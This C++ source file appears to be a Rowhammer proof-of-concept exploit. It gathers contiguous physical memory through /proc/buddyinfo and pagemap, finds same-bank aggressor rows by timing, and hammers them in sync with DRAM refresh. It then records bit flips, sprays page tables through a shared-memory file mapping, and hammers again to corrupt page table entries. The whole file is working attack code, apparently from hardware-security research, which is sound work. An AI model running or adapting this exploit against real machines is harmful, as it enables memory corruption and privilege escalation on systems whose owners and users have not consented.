#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>
#include <string>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <chrono>

#include "asm.h"
#include "utils.h"
#include "DRAMAddr.h"

int buddies_past = 0;

int read_buddyinfo(){
	int flag = 0;
	
	std::ifstream buddy_info1("/proc/buddyinfo");
	std::vector<std::string> buddies_current;

	if(buddy_info1.is_open()){
		std::string line;
		getline(buddy_info1, line); // zone DMA
		getline(buddy_info1, line); // zone DMA32
		while(getline(buddy_info1, line, ' ')){ // zone Normal
			if(line == "" || line == "\n") continue;
			buddies_current.push_back(line);
		}
	}
	buddy_info1.close();

	if(stoi(buddies_current[14]) == 0) return 0;
	
	if(buddies_past > stoi(buddies_current[14])) flag = 1;
	buddies_past = stoi(buddies_current[14]);

	if(flag == 1) return 1;
	else return 0;
}

void hammer_sync(std::vector<volatile char *> &aggressors, int acts,
                                      volatile char *d1, volatile char *d2) {
  size_t ref_rounds = 0;
  ref_rounds = std::max(1UL, acts/(aggressors.size()-2));
  size_t agg_rounds = ref_rounds;
  size_t before, after;
  size_t rounds = 0;

  for (size_t k = 0; k < aggressors.size(); k++) {
    clflush(aggressors[k]);
		// fprintf(stderr, "aggressor: 0x%lx\n", aggressors[k]);
  }
  
  (void)*d1;
  (void)*d2;

  // synchronize with the beginning of an interval
  while (true) {
    clflush(d1);
    clflush(d2);
    mfence();
    before = rdtscp();
    lfence();
    (void)*d1;
    (void)*d2;
    after = rdtscp();
    // check if an ACTIVATE was issued
		// fprintf(stderr, "after - before: %ld\n", after - before);
    if ((after - before) > 900) {
      break;
    }
  }

  // rounds = HAMMER_ROUNDS/aggressors.size()/agg_rounds;

	int n = 0;
  // for (size_t i = 0; i < rounds; i++) {
	while(n < 12800000){
    for (size_t j = 0; j < agg_rounds; j++) {
      // for (size_t k = 2; k < aggressors.size(); k++) { // S17
			for (size_t k = 0; k < aggressors.size() - 2; k++) { // H19
        clflush(aggressors[k]);
      }
      // for (size_t k = 2; k < aggressors.size(); k++) { // S17
			for (size_t k = 0; k < aggressors.size() - 2; k++) { // H19
        (void)(*aggressors[k]);
      }
      mfence();
    }
  
    // after HAMMER_ROUNDS/ref_rounds times hammering, check for next ACTIVATE
    while (true) {
			n++;
      before = rdtscp();
      lfence();
			(void)*d1;
      clflush(d1);
			(void)*d2;
			clflush(d2);
      after = rdtscp();
      lfence();
      // stop if an ACTIVATE was issued
			// fprintf(stderr, "after - before: %ld\n", after - before);
      if ((after - before) > 900) break;
    }
  }
}

size_t contiguous_memory(std::vector<volatile char *> &aggressors, 
																					int alloc_size, 
																					int num_rows){

	std::ifstream buddy_info("/proc/buddyinfo");
	std::vector<std::string> buddies_current;
	std::vector<size_t> addresses;

	if(buddy_info.is_open()){
		std::string line;
		getline(buddy_info, line); // zone DMA
		getline(buddy_info, line); // zone DMA32
		while(getline(buddy_info, line, ' ')){ // zone Normal
			if(line == "" || line == "\n") continue;
			buddies_current.push_back(line);
		}
	}
	buddy_info.close();

	int num_pages = 1;
	for(int k = 4; k < 14; k++){
		if(stoi(buddies_current[k]) > 20) num_pages += (1<<(k-4)) * (stoi(buddies_current[k]) - 10);
	}

	fprintf(stderr, "Allocate %d pages\n", num_pages);

	auto mapped_target = mmap(NULL, 4096 * num_pages, PROT_READ | PROT_WRITE,
		MAP_SHARED | MAP_POPULATE | MAP_ANONYMOUS, 0, 0);
	if (mapped_target==MAP_FAILED) {
		perror("mmap");
		exit(EXIT_FAILURE);
	}

	int flag = read_buddyinfo();

	while(1){
		auto mapped_target = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_POPULATE | MAP_ANONYMOUS, 0, 0);
		if (mapped_target==MAP_FAILED) {
			perror("mmap");
			exit(EXIT_FAILURE);
		}
		addresses.push_back((size_t)mapped_target);

		flag = read_buddyinfo();
		if(flag == 1){
			fprintf(stderr, "Start allocate 2MB\n");
			break;
		} 
	}

	if(flag != 1){
		for(auto address: addresses){
			munmap((char*)address, 4096);
		}
		exit(EXIT_FAILURE);
	}

	auto mapped_target1 = mmap(NULL, alloc_size, PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_POPULATE | MAP_ANONYMOUS, 0, 0);

	if (mapped_target1==MAP_FAILED) {
		perror("mmap");
		exit(EXIT_FAILURE);
	}

	int pmap_fd = open("/proc/self/pagemap", O_RDONLY);
	assert(pmap_fd >= 0);

	// for(size_t tmp = (size_t)mapped_target1; tmp < (size_t)mapped_target1 + alloc_size; tmp += 4096){
	// 	fprintf(stderr, "VA: %lx, PA: %lx\n", tmp, get_phys_addr2(tmp, pmap_fd));
		// DRAMAddr aggr((char*)(tmp));
		// fprintf(stderr, "(VA, PA): (0x%lx, 0x%lx), row: %ld, bank: %ld\n", tmp, get_phys_addr2(tmp, pmap_fd), aggr.row, aggr.bank);
	// }

	uint64_t before;
	int check1, check2;
	int rounds = 100;
	int stop = 0;
	
	//////////////////////////////////////////////////////////////////
	///////////////////   Find double-sided pair   ///////////////////
	//////////////////////////////////////////////////////////////////
	while(stop < 2) {
		for(size_t tmp1 = (size_t)mapped_target1; tmp1 < (size_t)mapped_target1 + alloc_size - 0x8000; tmp1 += 0x8000){
			uint64_t* time_vals = (uint64_t*) calloc(rounds, sizeof(uint64_t));
			for(int i = 0; i < rounds; i++){
				clflush((volatile void*)((int *)tmp1));
				clflush((volatile void*)((int *)(tmp1 + 0x10000)));
				mfence();
				before = rdtscp();
				lfence();
				check1 = *((int *)(tmp1));
				check2 = *((int *)(tmp1 + 0x10000));
				time_vals[i] = rdtscp() - before; 
			}
			uint64_t mdn = median(time_vals, rounds);

			if((mdn > THRESH)) {
				aggressors.push_back((volatile char *)((int *)tmp1)); 
				aggressors.push_back((volatile char *)((int *)(tmp1 + 0x10000))); 
				stop+=2;
				free(time_vals);
				break;
			}
			// fprintf(stderr, "1. base: (%p, 0x%lx), next: (0x%lx, 0x%lx), latency: %ld\n", tmp1, get_phys_addr2((size_t)tmp1, pmap_fd), 
			// 																																							tmp1+0x10000, get_phys_addr2((size_t)(tmp1+0x10000), pmap_fd), mdn);
			free(time_vals);
		}
	}

	// aggressors.push_back((volatile char *)((int *)(mapped_target1 + 0x18000))); 
	// aggressors.push_back((volatile char *)((int *)(mapped_target1 + 0x28000))); 
	
	int increment = 0x8000;

	for(size_t tmp = (size_t)aggressors[1] + 0x18000; tmp < (size_t)mapped_target1 + alloc_size - increment; tmp += increment){
		uint64_t* time_vals = (uint64_t*) calloc(rounds, sizeof(uint64_t));
		for(int i = 0; i < rounds; i++){
			clflush(aggressors[0]);
			clflush((volatile void*)((int *)tmp));
			mfence();
			before = rdtscp();
			lfence();
			check1 = (int)(*aggressors[0]);
			check2 = *((int *)(tmp));
			time_vals[i] = rdtscp() - before; 
		}
		uint64_t mdn = median(time_vals, rounds);
		// fprintf(stderr, "mdn: %ld\n", mdn);
		if((mdn > THRESH) && (stop < num_rows)) {
			aggressors.push_back((volatile char *)((int *)tmp)); 
			// tmp += 0x20000;
			stop++;
		}
		// fprintf(stderr, "base: (0x%lx, 0x%lx), next: (0x%lx, 0x%lx), latency: %ld\n", (size_t)aggressors[0], get_phys_addr2((size_t)aggressors[0], pmap_fd), 
		// 																																							(int *)tmp, get_phys_addr2((size_t)(int *)tmp, pmap_fd), mdn);
		free(time_vals);
	}
	
	for(auto address: addresses){
		munmap((char*)address, 4096);
	}
	munmap((char*)mapped_target, 4096 * num_pages);
	return (size_t)mapped_target1;
}

void find_dummies(std::vector<volatile char *> &aggressors, 
																					int alloc_size, size_t address, 
																					int num_rows){

	int pmap_fd = open("/proc/self/pagemap", O_RDONLY);
	assert(pmap_fd >= 0);

	// for(size_t tmp = (size_t)mapped_target1; tmp < (size_t)mapped_target1 + alloc_size; tmp += 4096){
	// 	fprintf(stderr, "VA: %lx, PA: %lx\n", tmp, get_phys_addr2(tmp, pmap_fd));
	// }

	volatile void * base_addr = nullptr;
	int increment = 0;

	base_addr = aggressors[0];
	increment = 4096;

	uint64_t before;
	int check1, check2;
	int rounds = 100;
	int stop = 0;

	for(size_t tmp = address; tmp < address + alloc_size - increment; tmp += increment){
		uint64_t* time_vals = (uint64_t*) calloc(rounds, sizeof(uint64_t));
		for(int i = 0; i < rounds; i++){
			clflush((volatile void*)base_addr);
			clflush((volatile void*)((int *)tmp));
			mfence();
			before = rdtscp();
			lfence();
			check1 = *((int *)((size_t)base_addr));
			check2 = *((int *)(tmp));
			time_vals[i] = rdtscp() - before; 
		}
		uint64_t mdn = median(time_vals, rounds);
		// fprintf(stderr, "mdn: %ld\n", mdn);
		if(aggressors.size() >= num_rows) return; 
		else if((mdn > THRESH) && (stop < num_rows)) {
			aggressors.push_back((volatile char *)((int *)tmp)); 
			tmp += 0x20000;
			stop++;
		}
		// fprintf(stderr, "base: (%p, 0x%lx), next: (0x%lx, 0x%lx), latency: %ld\n", base_addr, get_phys_addr2((size_t)base_addr, pmap_fd), 
		// 																																							(int *)tmp, get_phys_addr2((size_t)(int *)tmp, pmap_fd), mdn);
		free(time_vals);
	}
}

int main(int argc, char** argv){

	DRAMAddr::initialize(5, (volatile char *) 0x10000000000);

	int pmap_fd = open("/proc/self/pagemap", O_RDONLY);
	assert(pmap_fd >= 0);

	////////////////////////////////////////////////////////////////////
	///////////////////   Obtain contiguous memory   ///////////////////
	////////////////////////////////////////////////////////////////////
	std::vector<volatile char *> aggressors;
	size_t num_rows = stoi(std::string(argv[1]));
	int allocate_size = (1<<21);

	auto start = std::chrono::high_resolution_clock::now();
	size_t cont_start_addr = contiguous_memory(aggressors, allocate_size, num_rows);
	// fprintf(stderr, "addr: 0x%lx\n", cont_start_addr);

	std::vector<size_t> victim_addresses;

	int index = 0;
	while(aggressors.size() < num_rows){
		auto mapped_target1 = mmap(NULL, allocate_size, PROT_READ | PROT_WRITE,
			MAP_SHARED | MAP_POPULATE | MAP_ANONYMOUS, 0, 0);
			
		victim_addresses.push_back((size_t)mapped_target1);

		find_dummies(aggressors, allocate_size, victim_addresses[index], num_rows);
		index++;
	}
	
	auto finish = std::chrono::high_resolution_clock::now();

	DRAMAddr aggr1((char*)((size_t)aggressors[0]));
	DRAMAddr aggr2((char*)((size_t)aggressors[1]));
	if((aggr2.bank != aggr1.bank) || (aggr2.row - aggr1.row != 2)) {
		return 0;
	}

	std::cout << "contiguous memory: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
	fprintf(stderr, "allocate %ldMB chunks for dummy rows\n", victim_addresses.size()*2);
	for(size_t i = 0; i < aggressors.size(); i++){
		DRAMAddr aggr((char*)((size_t)aggressors[i]));
		fprintf(stderr, "Find! aggr: (0x%lx, 0x%lx), row: %ld, bank: %ld\n", (size_t)aggressors[i], get_phys_addr2((size_t)aggressors[i], pmap_fd), aggr.row, aggr.bank);
	}

	//////////////////////////////////////////////////////////////
	///////////////////   Write data pattern   ///////////////////
	//////////////////////////////////////////////////////////////
	fprintf(stderr, "write victim and aggressor data pattern start\n");

	for(size_t i = 0; i < allocate_size; i += 4096){
		for(size_t j = 0; j < 4096; j+=sizeof(int)){
			*((int *)(cont_start_addr+i+j)) = 0xffff0000;
			clflush((volatile char *)(int *)(cont_start_addr+i+j));
		}
	}

	for(size_t i = 0; i < aggressors.size(); i++){
		for(size_t j = 0; j < 0x8000; j += sizeof(int)){
			if((size_t)aggressors[i]+j > cont_start_addr + allocate_size) break;
			*((int *)((size_t)aggressors[i]+j)) = 0x0000ffff;
			clflush((volatile char *)(int *)((size_t)aggressors[i]+j));
		}
	}

	fprintf(stderr, "finish\n");

	/////////////////////////////////////////////////////
	//////////////   Prepare for compare   //////////////
	/////////////////////////////////////////////////////
	void *written_data_raw = malloc(4096);
	int *written_data = (int*)written_data_raw;
	for (size_t j = 0; j < (unsigned long) 4096/sizeof(int); ++j)
		written_data[j] = 0xffff0000;
	
	int retry = 0;
	int k = 0;
	std::vector<size_t> bitflips;

	do{
		k++;
		retry = 0;

		/////////////////////////////////////////////////////
		///////////   Write data pattern again   ////////////
		/////////////////////////////////////////////////////
		for(size_t i = 0; i < allocate_size; i += 4096){
			for(size_t j = 0; j < 4096; j+=sizeof(int)){
				*((int *)(cont_start_addr+i+j)) = 0xffff0000;
				clflush((volatile char *)(int *)(cont_start_addr+i+j));
			}
		}

		for(size_t i = 0; i < aggressors.size(); i++){
			for(size_t j = 0; j < 0x8000; j += sizeof(int)){
				if((size_t)aggressors[i]+j > cont_start_addr + allocate_size) break;
				*((int *)((size_t)aggressors[i]+j)) = 0x0000ffff;
				clflush((volatile char *)(int *)((size_t)aggressors[i]+j));
			}
		}

		/////////////////////////////////////////////////////
		///////////////////   Hammering   ///////////////////
		/////////////////////////////////////////////////////
		fprintf(stderr, "Attack start\n");
		start = std::chrono::high_resolution_clock::now();

		// hammer_sync(aggressors, 56, aggressors[0], aggressors[1]); // S17
		hammer_sync(aggressors, 36, aggressors[aggressors.size()-2], aggressors[aggressors.size()-1]); // H19
		
		finish = std::chrono::high_resolution_clock::now();
		fprintf(stderr, "Attack finish\n");

		std::cout << "attack time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;

		/////////////////////////////////////////////////////////
		///////////////////   Find bitflips   ///////////////////
		/////////////////////////////////////////////////////////
		int pass = 0;

		fprintf(stderr, "Compare start\n");
		start = std::chrono::high_resolution_clock::now();
		
		for(size_t i = cont_start_addr; i < cont_start_addr + allocate_size; i += sizeof(int)){
			if(*((int *)(i)) == 0xffff0000) continue;
			for(int k = 0; k < aggressors.size(); k++){
				if((i >= (size_t)aggressors[k]) && (i < ((size_t)aggressors[k] + 0x8000))){
					// if(*((int *)(i)) == 0x0000ffff){
					// 	pass = 1;
					// 	break;
					// }
					pass = 1;
					break;
				}
			}

			if(pass == 1){
				pass = 0;
				continue;
			}
			
			int expected_rand_value;
			expected_rand_value = written_data[(i % 4096) / sizeof(int)];
			fprintf(stderr, "Flipped data from 0x%x to 0x%x\n", expected_rand_value, *((int *)(i)));

			for (size_t c = 0; c < sizeof(int); c++) {
				volatile char *flipped_address = (volatile char *)(i + c);
				if (*flipped_address != ((char *) &expected_rand_value)[c]) {

					if((i % 2 == 0 && c == 0) || (i % 2 == 1 && c > 1)) {
						retry = 1;
						bitflips.push_back((size_t)flipped_address);
					}

					const auto flipped_addr_value = *(unsigned char *) flipped_address;
					const auto expected_value = ((unsigned char *) &expected_rand_value)[c];
					// *(unsigned char *) flipped_address = ((unsigned char *) &expected_rand_value)[c]; // restore value
					fprintf(stderr, "Flip at %p, %ldth bit, from 0x%x to 0x%x\n", flipped_address, c, expected_value, flipped_addr_value);
				}
			}
			// clflush((volatile void *)i);
		}
		finish = std::chrono::high_resolution_clock::now();

		std::cout << "compare time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
		fprintf(stderr, "Compare finish\n");
	
	} while(retry && k < 10);
	
	std::vector<size_t> flippable_addr;
	int exist = find_flippable(bitflips, flippable_addr);

	std::vector<size_t> file_mapped_addrs;

	if(exist){
		for(auto addr: flippable_addr){
			fprintf(stderr, "Flippable page: 0x%lx\n", addr);
			munmap((char*)(addr), 4096);
		}

		/////////////////////////////////////////////////////////
		////////////////   Page table spraying   ////////////////
		/////////////////////////////////////////////////////////
		int fd;

		if((fd = open("/dev/shm/feed", O_RDWR)) < 0){
			perror("File Open Error");
			exit(1);
		}

		// int num_pages = (1<<13) + (1<<12) + (1<<10) + (1<<9);
		int num_pages = (1<<12) + (1<<11);
		size_t alloc_size = (1<<30);

		for(int i = 0; i < num_pages; i++){
			auto mapped_target = mmap(NULL, alloc_size, PROT_READ | PROT_WRITE,
				MAP_SHARED | MAP_POPULATE, fd, 0); // 2MB page table per mapping

			if (mapped_target==MAP_FAILED) {
				perror("mmap");
				exit(EXIT_FAILURE);
			}
			file_mapped_addrs.push_back((size_t)mapped_target);
		}

		/////////////////////////////////////////////////////////////////
		//////////////////////////   Attack   ///////////////////////////
		/////////////////////////////////////////////////////////////////
		fprintf(stderr, "Start flipping PTE\n");
		// hammer_sync(aggressors, 56, aggressors[0], aggressors[1]); // S17
		hammer_sync(aggressors, 36, aggressors[aggressors.size()-2], aggressors[aggressors.size()-1]); // H19

		/////////////////////////////////////////////////////////////////
		//////////////////   Verify PTE corruption   ////////////////////
		/////////////////////////////////////////////////////////////////
		fprintf(stderr, "Verify bitflips\n");
		for(int i = 0; i < num_pages; i++){
			for(size_t tmp = 0; tmp < 1024*1024*1024; tmp += 4096){
				// if(tmp % 4096 == 0){
				if(*((char *) (file_mapped_addrs[i] + tmp)) != '2'){
					fprintf(stderr, "Pointing data: 0x%lx\n", *((size_t *) (file_mapped_addrs[i] + tmp)));
					// *((size_t *) (addresses[i] + tmp)) = 0x80000000a6ed5037;
					// for(int i = 0; i < num_pages; i++){
					//   munmap((char*)addresses[i], alloc_size);
					// }
					// return;
				}
			}
		}
	}

	/////////////////////////////////////////////////////////////////
	///////////////////   Free allocated memory   ///////////////////
	/////////////////////////////////////////////////////////////////
	for(auto address: file_mapped_addrs){
		munmap((char*)address, (1<<30));
	}

	for(auto address: victim_addresses){
		munmap((char*)address, allocate_size);
	}

	munmap((char*)(cont_start_addr), allocate_size);

	return 0;
}